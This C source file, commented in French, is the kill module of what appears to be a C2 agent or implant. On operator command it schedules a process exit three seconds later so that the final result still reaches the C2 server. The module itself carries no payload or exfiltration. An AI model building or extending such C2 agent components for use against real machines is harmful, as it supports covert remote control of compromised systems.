/*
 * ============================================================
 *  modules/mod_kill.c — Module de terminaison propre de l'agent
 *
 *  Rôle : Arrêter le processus agent proprement en laissant
 *         core.c envoyer le résultat final au serveur C2.
 *
 *  Stratégie "deferred exit" :
 *    1. Écrit le message de fin dans ctx->output
 *    2. Lance un timer de 3 secondes en arrière-plan
 *    3. Retourne 1 normalement → core.c envoie le résultat
 *       via son flux normal (send_result)
 *    4. 3 secondes plus tard, le timer appelle exit(0)
 *
 *  Pourquoi ne PAS appeler exit(0) directement dans le module :
 *    Si exit(0) est appelé avant que core.c appelle send_result(),
 *    la connexion TCP est fermée et le serveur ne reçoit jamais
 *    le résultat → l'opérateur voit un timeout de 60s.
 *
 *  Windows : CreateThread avec Sleep(3000) puis exit(0)
 *  Linux   : alarm(3) + handler SIGALRM qui appelle exit(0)
 * ============================================================
 */
#include "../platform.h"
#include "../config.h"
#include "../utils.h"
#include "module.h"


/* ============================================================
 *  IMPLÉMENTATION WINDOWS
 * ============================================================ */
#ifdef PLATFORM_WINDOWS

/**
 * Fonction du thread de terminaison différée.
 * Attend 3 secondes pour laisser core.c envoyer le résultat,
 * puis appelle exit(0) pour terminer le processus proprement.
 */
static DWORD WINAPI kill_exit_thread(LPVOID param) {
    (void)param;
    Sleep(3000);   /* 3s suffisent largement pour core.c → send_result() */
    exit(0);
    return 0;     /* Jamais atteint */
}

int mod_kill_exec(ModuleContext *ctx) {
    snprintf(ctx->output, ctx->output_size,
             "Agent killed by operator. Process will terminate in 3s.");

    /* Lance le thread de terminaison différée.
     * CloseHandle immédiat : on n'a pas besoin de le rejoindre,
     * exit(0) dans le thread terminera tout le processus. */
    HANDLE h = CreateThread(NULL, 0, kill_exit_thread, NULL, 0, NULL);
    if (h) CloseHandle(h);

    return 1;   /* Retour normal → core.c envoie le résultat */
}

#endif /* PLATFORM_WINDOWS */


/* ============================================================
 *  IMPLÉMENTATION LINUX
 * ============================================================ */
#ifdef PLATFORM_LINUX

/**
 * Handler SIGALRM : appelé 3 secondes après alarm(3).
 * À ce stade, core.c a eu le temps d'appeler send_result().
 */
static void kill_sigalrm_handler(int sig) {
    (void)sig;
    exit(0);
}

int mod_kill_exec(ModuleContext *ctx) {
    snprintf(ctx->output, ctx->output_size,
             "Agent killed by operator. Process will terminate in 3s.");

    /* alarm(3) envoie SIGALRM dans 3 secondes.
     * signal() installe le handler avant d'armer l'alarme.
     * Le signal interrompra sleep_ms() dans core.c — ce qui est
     * attendu : core.c a eu le temps d'appeler send_result()
     * avant que la boucle dorme. */
    signal(SIGALRM, kill_sigalrm_handler);
    alarm(3);

    return 1;   /* Retour normal → core.c envoie le résultat */
}

#endif /* PLATFORM_LINUX */
